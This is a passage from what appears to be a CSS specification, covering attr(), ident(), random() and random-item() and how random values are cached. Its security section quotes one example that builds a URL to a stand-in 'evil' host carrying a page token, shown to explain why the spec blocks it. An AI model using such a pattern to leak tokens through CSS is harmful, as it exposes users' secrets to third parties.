[<attr-unit>](#typedef-attr-unit) is intended to represents an [identifier](css-values-4.md#css-css-identifier) that is an ASCII case-insensitive match for the name of a CSS dimension unit, such as [px](css-values-4.md#px), or the [<delim-token>](css-syntax-3.md#typedef-delim-token) %. As this set expands regularly, it is actually specified as a [<custom-ident>](css-values-4.md#identifier-value), and triggers fallback behavior when it doesn’t match a known unit (rather than making the function invalid).

The arguments of [attr()](#funcdef-attr) are:

**[<attr-name>](#typedef-attr-name) **
:

Gives the name of the attribute being referenced, similar to <wq-name> (from [[SELECTORS-3]](#biblio-selectors-3)) but without the possibility of a wildcard prefix.

If no namespace is specified (just an identifier is given, like attr(foo)), the null namespace is implied. (This is usually what’s desired, as namespaced attributes are rare. In particular, HTML and SVG do not contain namespaced attributes.) Unless otherwise specified, the case-sensitivity/matching rules of [<attr-name>](#typedef-attr-name) are identical to [attribute selectors](selectors-4.md#attribute-selector) (and thus might depend on the host language).

Whitespace is not allowed between any of the components of [<attr-name>](#typedef-attr-name).

If [attr()](#funcdef-attr) is used in a property applied to an element, it references the attribute of the given name on that element; if applied to a [pseudo-element](selectors-4.md#pseudo-element), the attribute is looked up on the pseudo-element’s [originating element](selectors-4.md#originating-element).

**[<attr-type>](#typedef-attr-type) **
:

Specifies how the attribute value is [parsed](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) into a CSS value.

If given as a [type()](#funcdef-attr-type) function, the value is parsed according to the [<syntax>](#typedef-syntax) argument, and substitutes as the resulting tokens. For this purpose, <url> is invalid as a [<syntax-single-component>](#typedef-syntax-single-component). Values that fail to parse according to the syntax trigger fallback.

Note: <url> is banned because, for now, [attr()](#funcdef-attr) values can’t be used in URLs at all due to security concerns.

If given as the number keyword, it causes the attribute’s literal value, after stripping leading and trailing whitespace, to be [parsed](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) as a [<number-token>](css-syntax-3.md#typedef-number-token). Values that fail to parse trigger fallback.

If given as an [<attr-unit>](#typedef-attr-unit) value, the value is first parsed as if number keyword was specified; if this fails to parse, it triggers fallback. Then, if the <attr-unit> value matches a known CSS unit name or is %, the number is turned into a dimension or percentage with that value and the given unit. If the <attr-unit> does not match a known CSS unit, it triggers fallback.

If given as the raw-string keyword, or omitted entirely, it causes the attribute’s literal value to be treated as the value of a CSS string, with no CSS parsing performed at all (including CSS escapes, whitespace removal, comments, etc). No value triggers fallback; only the lack of the attribute entirely does.

Note: This is different from specifying a syntax of type(*), which still triggers CSS parsing (but with no requirements placed on it beyond that it parse validly), and which substitutes the result of that parsing directly as tokens, rather than as a [<string>](css-values-4.md#string-value) value.

**[<declaration-value>](css-syntax-3.md#typedef-declaration-value) **
:

Specifies a fallback value for the [attr()](#funcdef-attr), which will be substituted instead of the attribute’s value if the attribute is missing or fails to parse as the specified type.

If the [<attr-type>](#typedef-attr-type) argument is omitted, the fallback defaults to the empty string if omitted; otherwise, it defaults to the guaranteed-invalid value if omitted.

If a property contains one or more [attr()](#funcdef-attr) functions, and those functions are syntactically valid, the entire property’s grammar must be assumed to be valid at parse time. It is only syntax-checked at computed-value time, after attr() functions have been [substituted](#substitute-arbitrary-substitution-function).

Note that the default value need not be of the type given. For instance, if the type required of the attribute by the author is <length>, the default could still be auto, like in width: attr(size <length>, auto);.

<a id="example-eeda89e8"></a> This example shows the use of attr() to visually illustrate data in an XML file:

```
<stock>
  <wood length="12"/>
  <wood length="5"/>
  <metal length="19"/>
  <wood length="4"/>
</stock>

stock::before {
  display: block;
  content: "To scale, the lengths of materials in stock are:";
}
stock > * {
  display: block;
  width: attr(length em, 0px);
  height: 1em;
  border: solid thin;
  margin: 0.5em;
}
wood {
  background: orange url(wood.png);
}
metal {
  background: silver url(metal.png);
}
```

#### <a id="attr-substitution"></a>8.7.1. Substitution

[attr()](#funcdef-attr) is an [arbitrary substitution function](#arbitrary-substitution-function), similar to var(), and so is replaced with the value it represents (if possible) at [computed value](css-cascade-5.md#computed-value) time; otherwise, it’s replaced with the guaranteed-invalid value, which will make its declaration [invalid at computed-value time](#invalid-at-computed-value-time).

To *<a id="replace-an-attr-function"></a>[replace an attr() function](#replace-an-arbitrary-substitution-function)*, given a list of *arguments*:

1.
Let *el* be the element that the style containing the [attr()](#funcdef-attr) function is being applied to. Let *first arg* be the first [<declaration-value>](css-syntax-3.md#typedef-declaration-value) in *arguments*. Let *second arg* be the <declaration-value>? passed after the comma, or null if there was no comma.
2.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *first arg*, then [parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) it as [<attr-name>](#typedef-attr-name) [<attr-type>](#typedef-attr-type)?. If that returns failure, jump to the last step (labeled FAILURE). Otherwise, let *attr name* and *syntax* be the results of parsing (with *syntax* being null if [<attr-type>](#typedef-attr-type) was omitted), processed as specified in the definition of those arguments.
3.
If *attr name* exists as an attribute on *el*, let *attr value* be its value; otherwise jump to the last step (labeled FAILURE).
4.
If *syntax* is the keyword number or an [<attr-unit>](#typedef-attr-unit) value, parse *attr value* against [<attr-type>](#typedef-attr-type). If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).
Note: No parsing or modification of any kind is performed on the value.
5.
If *syntax* is null or the keyword raw-string, return a CSS [<string>](css-values-4.md#string-value) whose value is *attr value*.
Note: No parsing or modification of any kind is performed on the value.
6.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *attr value*, with «"attribute", *attr name*» as the [substitution context](#substitution-context), then [parse with a <syntax>](#parse-with-a-syntax) *attr value*, with *syntax* and *el*. If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).
7.
**FAILURE:**
  1.
  If *second arg* is null, and *syntax* was omitted, return an empty CSS [<string>](css-values-4.md#string-value).
  2.
  If *second arg* is null, return the guaranteed-invalid value.
  3.
  [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *second arg*, and return the result.

#### <a id="attr-security"></a>8.7.2. Security

An [attr()](#funcdef-attr) function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).

In general, this is fine. It is difficult to use [attr()](#funcdef-attr) to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.

To guard against this, the values produced by an [attr()](#funcdef-attr) are considered *<a id="attr-taint"></a>attr()-tainted*, as are functions that contain an [attr()-tainted](#attr-taint) value.

The substitution value of an [arbitrary substitution function](#arbitrary-substitution-function) is [attr()-tainted](#attr-taint) *as a whole* if any attr()-tainted values were involved in creating that substitution value. This extends to the equivalent token sequence when substituting values of registered custom properties.

Using an [attr()-tainted](#attr-taint) value as or in a [<url>](css-values-4.md#url-value) makes a declaration [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="example-21e44dca"></a> For example, all of the following are [invalid at computed-value time](#invalid-at-computed-value-time):

-
[background-image: src(attr(foo));](css-backgrounds-3.md#propdef-background-image) - can’t use it directly.
-
[background-image: image(attr(foo))](css-backgrounds-3.md#propdef-background-image) - can’t use it in other [<url>](css-values-4.md#url-value)-taking functions.
-
[background-image: src(string("http://example.com/evil?token=" attr(foo)))](css-backgrounds-3.md#propdef-background-image) - can’t "launder" it thru another function.
-
--foo: attr(foo); background-image(src(var(--foo))) (assuming that --foo is a registered custom property with string syntax) - can’t launder the value thru another property, either.

However, using [attr()](#funcdef-attr) for other purposes is fine, even if the usage is *near* a url:

-
[background-image: image("foo.jpg", attr(bgcolor type(<color>)))](css-backgrounds-3.md#propdef-background-image) is fine; the [attr()](#funcdef-attr) is providing a fallback color, and the [<url>](css-values-4.md#url-value) isn’t [attr()-tainted](#attr-taint).

Using [attr()](#funcdef-attr) indirectly via a custom property causes [attr()-tainting](#attr-taint) of the whole custom property value:

-
--foo: image("foo.jpg", attr(bgcolor type(<color>))); background-image: var(--foo); is [invalid at computed-value time](#invalid-at-computed-value-time).
<a id="issue-36b2e6b3"></a> Investigate partial tainting of custom property values.

Note: Implementing this restriction requires tracking a dirty bit on values constructed from [attr()](#funcdef-attr) values, since they can be fully resolved into a string via registered custom properties, so you can’t rely on just examining the value expression. Note that non-string types can even trigger this, via functions like string() that can stringify other types of values: --foo: attr(foo type(<number>)); background-image: src(string(var(--foo))) needs to be invalid as well.

### <a id="ident"></a>8.8. Constructing [<custom-ident>](css-values-4.md#identifier-value) values: the [ident()](#funcdef-ident) function

The *<a id="funcdef-ident"></a>ident()* function represents an arbitrary [<ident>](css-values-4.md#typedef-ident), built from one or more separate idents, strings, and integers. It is an [arbitrary substitution function](#arbitrary-substitution-function).

```
<ident()> = ident( <ident-arg>+ )
<a id="typedef-ident-arg"></a><ident-arg> = <string> | <integer> | <ident>
```

The [ident()](#funcdef-ident) function’s [argument grammar](#argument-grammar) is:

```
<a id="typedef-ident-args"></a><ident-args> = ident( <declaration-value> )
```

[ident()](#funcdef-ident) can be used anywhere that an [identifier](css-values-4.md#css-css-identifier) is expected, but it’s most useful to construct [<custom-ident>](css-values-4.md#identifier-value) or [<dashed-ident>](css-values-4.md#typedef-dashed-ident) values.

<a id="example-9a12e9c5"></a> In the following example, each matched element gets a unique view-timeline-name by combining a shared prefix with [sibling-index()](#funcdef-sibling-index) to differentiate each element:

```
.item {
  /* vtl-1, vtl-2, vtl-3, … */
  view-timeline-name: ident("vtl-" sibling-index());
}
```

<a id="example-d46a7707"></a> While in many cases [attr()](#funcdef-attr) with the [<attr-type>](#typedef-attr-type) set to [<custom-ident>](css-values-4.md#identifier-value) will do, [ident()](#funcdef-ident) can be used to construct a <custom-ident> using values that come from other elements. In the following example, the ident() function combines a custom property defined on a parent with an attr() value coming from the element itself:

```
.card[id] {
  /* E.g. card1, card2, card3, … */
  --id: attr(id);

  view-transition-name: ident(var(--id));
  view-transition-class: card;

  h1 {
    /* E.g. card1-title, card2-title, card3-title, … */
    view-transition-name: ident(var(--id) "-title");
    view-transition-class: card-title;
  }
}
```

<a id="example-f9589b2a"></a> To generate a [<dashed-ident>](css-values-4.md#typedef-dashed-ident), simply use a -- ident as the first segment:

```
.element {
  anchor-name: ident(-- attr(id));
}
```

To *<a id="replace-an-ident-function"></a>[replace an ident() function](#replace-an-arbitrary-substitution-function)*, given a list of *arguments*:

1.
Let *arg* be the first item of *arguments*.
Note: [ident()](#funcdef-ident) only takes a single argument.
2.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *arg*, then [parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) it as [<ident-arg>](#typedef-ident-arg)+. If that returns failure, return the guaranteed-invalid value. Otherwise, let *pieces* be the result.
3.
Replace each item in *pieces* with its [computed value](css-cascade-5.md#computed-value). If any item does not, at this point, become a string, [integer](css-values-4.md#integer), or [ident](css-values-4.md#css-css-identifier), return the guaranteed-invalid value.
Note: For example, if the value is a function that can’t resolve at [computed value](css-cascade-5.md#computed-value) time.
4.
Serialize each item in *pieces*, then concatenate the list. Return an [ident](css-values-4.md#css-css-identifier) whose value is the result. If the result can’t be represented as an ident (for example, the empty string), instead return the guaranteed-invalid value.

## <a id="randomness"></a>9. Generating Random Values

It is often useful to incorporate some degree of "randomness" to a design, either to make repeated elements on a page feel less static and identical, or just to add a bit of "flair" to a page without being distracting.

The [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions (the *<a id="css-random-function"></a>random functions*) allow authors to incorporate randomness into their page, while keeping this randomness predictable from a design perspective, letting authors decide whether a random value should be reused in several places or be unique between instances.

The exact random-number generation method is UA-defined. It *should* be the case that two distinct random values have no easily-detectable correlation, but this specification intentionally does not specify what that means in terms of cryptographic strength. Authors *must not* rely on [random functions](#css-random-function) for any purposes that depend on quality cryptography.

### <a id="random"></a>9.1. Generating a Random Numeric Value: the [random()](#funcdef-random) function

The *<a id="funcdef-random"></a>random()* function is a [math function](css-values-4.md#math-function) that represents a random value between a minimum and maximum value, drawn from a uniform distribution, optionally limiting the possible values to a step between those limits:

```
<random()> = random( <random-key>? , <calc-sum>, <calc-sum>, <calc-sum>? )
```

<a id="example-48ec89a1"></a> Imagine you have several .box elements, all styled with the following CSS:

```
.box {
  width: random(???, 100px, 200px);
  height: random(???, 100px, 200px);
  border: thin solid;
}
```

Depending on what [<random-key>](#typedef-random-key) you provide in place of the ???, you’ll get significantly different behavior for the elements:

**[auto](#valdef-random-auto)/omitted, **maximum random**: **************** **
:

Each property gets a different value, and it’s different per element too, so you get a bunch of **different** random **rectangles**.

**--foo, **shared by name**: **************** **
:

Both properties use the same value, and every element shares that value, so you get a bunch of **identical** random **squares**.

**[element-scoped](#valdef-random-element-scoped), **scoped per element**: **************** **
:

Both properties use the same value, but each element gets a different value, so you get a bunch of **different** random **squares**.

**[property-scoped](#valdef-random-property-scoped), **scoped per property**: **************** **
:

Each property gets a different value, but each element shares that value, so you get a bunch of **identical** random **rectangles**.

See [§ 9.3 Evaluating Random Values](#random-evaluation) and [§ 9.4 Sharing (Or Not) Random Values: the <random-key> value](#random-caching) for details on how the function is evaluated. Its arguments are:

**[<random-key>](#typedef-random-key) **
:

The optional [<random-key>](#typedef-random-key) controls which [random functions](#css-random-function) in the document will share a [random base value](#random-base-value) and which will get distinct values. If <random-key> is omitted, it behaves as [auto](#valdef-random-auto).

See [§ 9.4 Sharing (Or Not) Random Values: the <random-key> value](#random-caching) for a full description of this value.

**[<calc-sum>](css-values-4.md#typedef-calc-sum), <calc-sum> **
:

The two required [calculations](css-values-4.md#calc-calculation) specify the minimum and maximum value the function can resolve to. Both limits are inclusive (the result can be the min or the max).

If the maximum value is less than the minimum value, it behaves as if it’s equal to the minimum value.

<a id="example-84ddc1e3"></a> For example, random(100px, 300px) will resolve to a random [<length>](css-values-4.md#length-value) between 100px and 300px: it might be 100px, 300px, or any value between them like 234.5px.

**[<calc-sum>](css-values-4.md#typedef-calc-sum)? **
:

The final optional argument specifies a step value: the values the function can resolve to are further restricted to the form `min + (N * step)`, where N is a non-negative integer chosen uniformly randomly from the possible values that result in an in-range value.

<a id="example-e07293f3"></a> For example, random(100px, 300px, 50px) can only resolve to 100px, 150px, 200px, 250px, or 300px; it will never return a value like 120px.

Note that the max value might not actually show up as a possible value; for example, in random(100px, 200px, 30px), the possible values are 100px, 130px, 160px, and 190px.

Note: Even if it’s *intended* that `min` and `max` are exactly some integer multiple of `step` apart, numeric precision issues can prevent that from being true. To avoid these issues, if the max value is *very close* to equalling a stepped value (above or below it), the max value is used as the final stepped value instead. See [§ 9.3 Evaluating Random Values](#random-evaluation) for precise details.

<a id="example-28cc10b2"></a> As explained in the definition of [round()](css-values-4.md#funcdef-round), CSS has no "natural" precision for values, but the step value can be used to assign one.

For example, random(100px, 500px, 1px) restricts it to resolving only to whole px values; random(1, 10, 1) is restricted to resolving only to integers; etc.

Note: Providing a step value *is not equivalent* to generating a random value and then rounding it; random(100px, 200px, 50px) will generate three possible values (100px, 150px, 200px) all with a 1/3 chance, while round(random(100px, 200px), 50px) will generate the same three possible values, but 150px will occur 1/2 the time, while 100px and 200px will only occur 1/4 of the time each.

All of the [calculation](css-values-4.md#calc-calculation) arguments can resolve to any value, but must have a [consistent type](css-values-4.md#css-consistent-type) or else the function is invalid; the result’s type will be the consistent type.

<a id="example-ff333f2e"></a> For example, random(50px, 100%, 1em) is valid (assuming percentages are valid in the context this is used, and resolve to a [<length>](css-values-4.md#length-value)), as all three arguments resolve to a length.

However, random(50px, 180deg) is invalid, as lengths and angles are not the same type.

#### <a id="random-infinities"></a>9.1.1. Argument Ranges

In random(A, B), if A is infinite, the result is infinite.

If A is finite, but the difference between A and B is either infinite or large enough to be treated as infinite in the user agent, the result is NaN.

In random(A, B, C), the same behavior for A and B as defined above applies.

If C is infinite, the result is A.

If C is negative, zero, or positive but close enough to zero that the range for the step multiplier (the `N` mentioned in [§ 9.3 Evaluating Random Values](#random-evaluation)) would be infinite in the user agent, the step must be *ignored*. (The function is treated as if only A and B were provided.)

Note: As usual for [math functions](css-values-4.md#math-function), if any argument calculation is NaN, the result is NaN.

### <a id="random-item"></a>9.2. Picking a Random Item From a List: the [random-item()](#funcdef-random-item) function

The *<a id="funcdef-random-item"></a>random-item()* function resolves to a random item from among its list of items.

```
<random-item()> = random-item( <random-key> , [ <declaration-value>? ]# )
```

The [random-item()](#funcdef-random-item) function’s [argument grammar](#argument-grammar) is:

```
<a id="typedef-random-item-args"></a><random-item-args> = random-item( <declaration-value>, [ <declaration-value>? ]# )
```

See [§ 9.3 Evaluating Random Values](#random-evaluation) and [§ 9.4 Sharing (Or Not) Random Values: the <random-key> value](#random-caching) for details on how the function is evaluated.

The *required* [<random-key>](#typedef-random-key) is interpreted identically to [random()](#funcdef-random). (See [§ 9.4 Sharing (Or Not) Random Values: the <random-key> value](#random-caching) for details.)

Note: The [<random-key>](#typedef-random-key) argument is required in [random-item()](#funcdef-random-item), but optional in [random()](#funcdef-random), for parsing reasons (it’s impossible to tell whether random-item(--foo, --bar, --baz) has three [<declaration-value>](css-syntax-3.md#typedef-declaration-value) arguments or two and a [<random-cache-key>](#typedef-random-cache-key)).

The remaining arguments are arbitrary sequences of CSS values. The [random-item()](#funcdef-random-item) function is substituted with one of these sequences, chosen uniformly at random.

The [random-item()](#funcdef-random-item) function is an [arbitrary substitution function](#arbitrary-substitution-function), like var().

That is, if you use [random-item()](#funcdef-random-item):

-
So long as [random-item()](#funcdef-random-item) itself (and any other [arbitrary substitution functions](#arbitrary-substitution-function)) is syntactically valid, the entire property is assumed to be valid at parse time.
-
[random-item()](#funcdef-random-item) is substituted with whatever value it resolves to at [computed value](css-cascade-5.md#computed-value) time when you’d [substitute a var()](css-variables-1.md#substitute-a-var), so children all inherit the same resolved value.
-
If the substituted value ends up making the property invalid, the property’s value becomes the guaranteed-invalid value.

To *<a id="replace-a-random-item-function"></a>[replace a random-item() function](#replace-an-arbitrary-substitution-function)*, given a list of *arguments*:

1.
Let *value sharing* be the first [<declaration-value>](css-syntax-3.md#typedef-declaration-value) in *arguments*, and *options* be a list of the remaining <declaration-value>? options.
2.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *value sharing*, then [parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) it as [<random-key>](#typedef-random-key). If parsing returns failure, return the guaranteed-invalid value; otherwise set *value sharing* to the result.
3.
Select one of the *options*, as specified in [§ 9.3 Evaluating Random Values](#random-evaluation), using *value sharing* as specified in [§ 9.4 Sharing (Or Not) Random Values: the <random-key> value](#random-caching), and let *chosen option* be the result.
4.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *chosen option*, then return the result.

### <a id="random-evaluation"></a>9.3. Evaluating Random Values

Given a [random function](#css-random-function) with a [random base value](#random-base-value) *R*, the value of the function is:

**for a [random()](#funcdef-random) function with *min* and *max*, but no step **
:

Return `*min* + *R* * (*max* - *min*)`

**for a [random()](#funcdef-random) function with *min*, *max*, and *step* **
:

-
Let *epsilon* be `*step* / 1000`, or the smallest representable value greater than zero in the numeric type being used if *epsilon* would round to zero.
-
Let *N* be the largest integer such that `*min* + *N* * *step*` is less than or equal to *max*.
If *N* produces a value that is not within *epsilon* of *max*, but *N*+1 would produce a value within *epsilon* of *max*, set *N* to *N*+1.
-
Let *step index* be a [random integer](#generate-a-random-integer) less than *N*+1, given *R*.
-
Let *value* be `*min* + *step index* * *step*`.
-
If *step index* is *N* and *value* is within *epsilon* of *max*, return *max*.
-
Otherwise, return *value*.

Epsilon/max Details

*epsilon* was chosen to be `*step* / 1000` as a useful "middle ground" value: small enough that it’s very unlikely to accidentally trigger when the author didn’t intend it, but large enough that it’s guaranteed to catch floating-point precision errors.

It’s size is also within the realm for authors to exploit themselves; if their *max* is meant to be an integer multiple of their *step*, but the *step* is not a terminating decimal, as long as they write the *step* with 5 or 6 digits of precision then the largest value should land within *epsilon* of *max*.

For example, while random(0px, 100px, 33.3px) will not generate a 100px value (the epsilon is .0333px, but 3 steps yields 99.9px, which is .1px from *max*, more than the epsilon), random(0px, 100px, 33.333px) will (the epsilon is .033333px, similar to the previous example, but 3 steps yields 99.999px, which is .001px from *max*, much less than the epsilon). (A sufficiently large number of steps could still cause enough divergence to defeat this, but it works for any remotely reasonable use-case.)

Using a [calculation](css-values-4.md#calc-calculation) to "exactly" represent non-terminating decimals will also work, of course: random(0px, 100px, 100px / 3) is guaranteed to be able to generate a 100px value, as the step value will only be subject to floating-point precision errors far smaller than the epsilon.

**for a [random-item()](#funcdef-random-item) function with *N* [<declaration-value>](css-syntax-3.md#typedef-declaration-value)? arguments: **
:

-
Let *index* be a [random integer](#generate-a-random-integer) less than *N*, given *R*.
-
Return the *index*’th argument (0-indexed).

To *<a id="generate-a-random-integer"></a>generate a random integer* less than some integer *limit* given a [random base value](#random-base-value) *R*, return round(down, *R* * *limit*, 1)

### <a id="random-caching"></a>9.4. Sharing (Or Not) Random Values: the [<random-key>](#typedef-random-key) value

CSS is a declarative language, so functions don’t have a specific “time” when they’re evaluated; the user agent is free to “execute” functions in any order, as many times as they want, as every execution will return the same value. This is difficult to square with random-value functions, which are inherently *stateful* and care about when, how often, and in what order they’re executed.

To solve this, the [random functions](#css-random-function) are associated with a [random cache name](#random-cache-name), ensuring that any time the random function is evaluated with the same cache key, it will return the same [random base value](#random-base-value); and also that random functions with *different* caching keys will return *different* random base value from each other (unless they are, randomly, the same).

The [<random-key>](#typedef-random-key) value controls this behavior, and defaults to [auto](#valdef-random-auto) when omitted. It’s syntax is as follows, and interpreted as described below:

```
<a id="typedef-random-key"></a><random-key> = auto | <random-cache-key> | fixed <number [0,1]>
<a id="typedef-random-cache-key"></a><random-cache-key> =  <dashed-ident> || element-scoped
                       || [ property-scoped | property-index-scoped | <random-ua-ident> ]
<a id="typedef-random-ua-ident"></a><random-ua-ident> = <custom-ident>
```

***<a id="valdef-random-auto"></a>auto* **
:

The [random function](#css-random-function) is roughly “as random as possible”: the [random cache name](#random-cache-name), and thus the result, varies across every [random()](#funcdef-random) instance in a multi-component value, across different properties, and across different elements.

This is equivalent to specifying element-scoped property-index-scoped, and simplifies in exactly the same way.

***<a id="valdef-random-random-cache-key"></a>[<random-cache-key>](#typedef-random-cache-key)* **
:

The [<random-cache-key>](#typedef-random-cache-key) specifies the [random cache name](#random-cache-name), allowing it to be explicitly shared (or not) with other uses of [random functions](#css-random-function). Every random function using the same random cache name will get the same random value; every one using a *different* random cache name will get unrelated random values.

- The [<dashed-ident>](css-values-4.md#typedef-dashed-ident) gives the value an explicit name. If omitted, this part of the name is null.
- *<a id="valdef-random-element-scoped"></a>element-scoped* adds an element-specific identifier to the [random cache name](#random-cache-name), so different elements will get different random values.
If the [random function](#css-random-function) is being evaluated inside of a custom function, the element-specific identifier is for the "hypothetical element" that the function’s styles are evaluated on, so [element-scoped](#valdef-random-element-scoped) will give you different random values on every function invocation.
- *<a id="valdef-random-property-scoped"></a>property-scoped* adds the property name the [random function](#css-random-function) is being used on to the [random cache name](#random-cache-name), so different properties will get different random values. Note that shorthand declarations will apply the [shorthand property](css-cascade-5.md#shorthand-property)’s name.
- *<a id="valdef-random-property-index-scoped"></a>property-index-scoped* adds the property name *and* the index of the random function among all the random functions used in the same property value to the [random cache name](#random-cache-name), so multiple instances of a [random function](#css-random-function) in the same declaration will each get different random cache names. Note this index is assigned *before* [shorthand](css-cascade-5.md#shorthand-property) expansion.

See [§ 9.4.1 Simplification of <random-key>](#random-simplify) for how these values resolve.

The *<a id="valdef-random-random-ua-ident"></a>[<random-ua-ident>](#typedef-random-ua-ident)* value, like [fixed](#valdef-random-fixed) below, isn’t intended to be specified by authors, but can show up in [computed values](css-cascade-5.md#computed-value). It is a [<custom-ident>](css-values-4.md#identifier-value) that must start with the prefix ua-, or else it is invalid. When generated automatically by the user agent, it follows certain specific patterns; see [§ 9.4.1 Simplification of <random-key>](#random-simplify) for details.

***<a id="valdef-random-fixed"></a>fixed [<number [0,1]>](css-values-4.md#number-value)* **
:

If fixed [<number>](css-values-4.md#number-value) is specified, the [random function](#css-random-function) bypasses the [random cache name](#random-cache-name) entirely, and just uses the [<number>](css-values-4.md#number-value) as its [random base value](#random-base-value) directly.

While 1 is technically allowed as a valid value (because CSS grammars can only express closed ranges), the [random base value](#random-base-value) is clamped to the highest representable value less than 1, so random base values remain in the half-open range `[0, 1)`.

Note: While this value *might* be useful for authors to get predictable values while testing a page, the reason it exists is to fix some corner cases in [inheritance](css-cascade-5.md#css-inheritance) that would otherwise cause elements to *not* share [random base values](#random-base-value) when authors would expect them to. It is observable in some rare [computed values](css-cascade-5.md#computed-value), but otherwise will never show up in an element’s styles.

<a id="example-cd1f495d"></a> Note that only the [random cache name](#random-cache-name) controls whether two [random functions](#css-random-function) have the same value or not; their *other* arguments don’t contribute in any way.

Thus, the following two styles:

```
.foo {
  width: random(--foo, 100px, 200px);
  animation: --pulse linear random(--foo, 1s, 2s);
}
```

will actually share a [random base value](#random-base-value) because their [random cache names](#random-cache-name) are identical. If this random cache name is linked to a random base value of 0.25, for example, this will give the element a width of 125px and an animation-duration of 1.25s.

If you want the values to be completely uncorrelated, give them distinct names (--foo vs --bar) or mix in additional information that will uniquify their [random cache names](#random-cache-name) (specifying --foo property-scoped, or omitting the [<random-key>](#typedef-random-key) argument entirely)

<a id="auto-naming-details"></a>

Details about how [auto](#valdef-random-auto) works

The [auto](#valdef-random-auto) value is identical to specifying --foo element-scoped property-index-scoped, just with an unobservable name that you can’t manually match with a [<dashed-ident>](css-values-4.md#typedef-dashed-ident).

*Usually*, this ensures that every instance of a [random function](#css-random-function), on every element, gets a different [random cache name](#random-cache-name) and thus a different [random base value](#random-base-value). However, this can fail in some corner cases, causing random values to be shared when it’s unexpected. For example, in the following:

```
.foo {
  animation: flicker linear random(1s, 2s);
}
.foo:hover {
  animation: glow linear random(4s, 6s);
}
```

The two [random()](#funcdef-random) functions have the same [random cache name](#random-cache-name) on a given element (both are the first [random function](#css-random-function) used in animation), so they’ll share [random base values](#random-base-value) on a single element and generate related random values, even though the author likely considers them to be different instances of random().

This unexpected sharing is, unfortunately, unavoidable. CSS generally doesn’t care *how* you organize styles for your elements; in particular, whether you style several elements with a single style rule like .foo, .bar {...}, multiple style rules like .foo {...} .bar {...}, or by setting the `style` attribute on each element individually, you’ll get the same results. This needs to continue to be true even when you’re using random values, so we can’t distinguish random values by how they’re *set*, only how they’re *used*.

There’s no syntactic distinction in a stylesheet between styling "related" elements and "independent" elements, or distinguishing "independent" states, so we must treat all elements as potentially related for this purpose. If this is undesirable, you can always supply a sufficiently unique [<dashed-ident>](css-values-4.md#typedef-dashed-ident) yourself, like random(--sidebar-width, ...) on one set of elements and random(--card-width, ...) on another, or random(--flicker, ...) and random(--glow, ...) on the different rules.

More specifically, the [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions are defined to generate random values under the following caching semantics:

-
Each instance of a [random function](#css-random-function) in styles has an associated *<a id="random-base-value"></a>random base value*.
If the [random function’s](#css-random-function) [<random-key>](#typedef-random-key) is fixed [<number>](css-values-4.md#number-value), the [random base value](#random-base-value) is that number.
Otherwise, the [random base value](#random-base-value) is a pseudo-random real number in the range `[0, 1)` (greater than or equal to 0 and less than 1), generated from a uniform distribution, and influenced by the function’s [random cache name](#random-cache-name).
-
Each [random function](#css-random-function) also specifies a *<a id="random-cache-name"></a>random cache name*. Two random functions with the same [random cache name](#random-cache-name) must also have the same [random base value](#random-base-value); two functions with different random cache names must have distinct random base values. (That is, generated by a fresh random operation; randomness might of course produce the same actual value.)
It is intentionally unspecified *how* the [random cache name](#random-cache-name) is used to achieve this. It can literally cache a generated random value, or be used as a seed for a PRNG, etc.
-
A [random cache name](#random-cache-name) is a tuple of:
  1.
  A nullable string name: the value of the [<dashed-ident>](css-values-4.md#typedef-dashed-ident), if specified; otherwise null.
  2.
  A nullable string property/index value: the value of the [<random-ua-ident>](#typedef-random-ua-ident), if specified/calculated; otherwise null.
  3.
  A nullable /element identifier/ uniquely identifying the object the style is being applied to (the `Element`, [pseudo-element](selectors-4.md#pseudo-element), or custom function evaluation’s "hypothetical element"), if [element-scoped](#valdef-random-element-scoped) is specified; otherwise null.
  4.
  A /document identifier/ identifying the `Document` the styles are from.
The /element identifier/ and /document identifier/ must have the same lifetimes and equivalence semantics as a JavaScript reference to the `Element` or `Document`.
<a id="issue-0dcd6797"></a> The behavior for pseudo-elements needs to be clarified.
-
The [random cache name](#random-cache-name) and [random base value](#random-base-value) must be determined by [computed value](css-cascade-5.md#computed-value) time, before [inheritance](css-cascade-5.md#css-inheritance), so that a random function that is unresolved by inheritance time (due to containing, for example, a layout-sensitive percentage) does not have a different behavior on children than one that resolves immediately.

<a id="example-2ac13183"></a> Shorthands are recorded as part of the [random cache name](#random-cache-name), rather than the longhand the value gets expanded to. For example:

```
.same-tb-same-rl {
  margin: random(0px, 10px) random(0px, 10px);
}
```

Here, the [<random-ua-ident>](#typedef-random-ua-ident) part of the [random cache name](#random-cache-name) is "ua-margin-1" and "ua-margin-2", respectively. After expansion, then, [margin-top](css-box-4.md#propdef-margin-top) and [margin-bottom](css-box-4.md#propdef-margin-bottom) will share the same random value, and [margin-left](css-box-4.md#propdef-margin-left) and [margin-right](css-box-4.md#propdef-margin-right) will share a different random value.

Combining shorthands with longhands will produce different caching keys:

```
.different-tb-same-rl {
  margin: random(0px, 10px) random(0px, 10px);
  margin-bottom: random(0px, 10px);
}
```

